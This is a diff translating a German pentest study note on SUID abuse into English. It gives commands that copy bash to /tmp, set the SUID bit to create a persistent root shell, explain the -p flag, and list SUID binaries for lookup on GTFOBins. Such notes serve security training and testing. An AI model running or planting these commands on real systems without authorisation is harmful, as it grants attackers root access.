@@ -3,35 +3,35 @@ tags: [technique, privesc, linux]
 ---
 # SUID Abuse
 
-> **SUID-Bit**: Ein Programm läuft **immer mit den Rechten seines Besitzers**, egal wer es startet. Gehört es root → Ausführung als root.
+> **SUID bit**: a program always runs **with the permissions of its owner**, no matter who starts it. If root owns it → execution as root.
 
-## SUID-Bash als Root-Shell
+## SUID bash as a root shell
 
-Wenn ein root-Prozess (Cronjob, Service, Sudo-Befehl) einen Befehl für dich ausführt:
+When a root process (cron job, service, sudo command) runs an attacker-controlled command:
 
 ```bash
 cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
 ```
 
-Dann:
+Then:
 
 ```bash
-/tmp/rootbash -p     # -p = erhöhte Rechte behalten
+/tmp/rootbash -p     # -p = keep elevated privileges
 id                   # euid=0(root)
 ```
 
-> [!danger] `chmod +s` reicht nicht
-> `+s` → `-rws--S---` (SUID, aber **kein `x`** für Gruppe/Andere) → `Permission denied`.
-> `chmod 4755` → `-rwsr-xr-x` → ausführbar für alle. Zahlen-Logik → [[Dateirechte und chmod]].
+> [!danger] `chmod +s` is not enough
+> `+s` → `-rws--S---` (SUID, but **no `x`** for group/others) → `Permission denied`.
+> `chmod 4755` → `-rwsr-xr-x` → executable for everyone. Number logic → [[File Permissions and chmod]].
 
-## Vorhandene SUID-Binaries finden
+## Finding existing SUID binaries
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-=> gefundene Binaries gegen [GTFOBins](https://gtfobins.github.io/) prüfen.
+=> check the found binaries against [GTFOBins](https://gtfobins.github.io/).
 
-## Warum `-p`?
+## Why `-p`?
 
-Ohne `-p` wirft bash die SUID-Rechte beim Start aus Sicherheit weg. Mit `-p` bleibst du root.
+Without `-p`, bash drops the SUID privileges on start for safety. With `-p` the root privileges are kept.
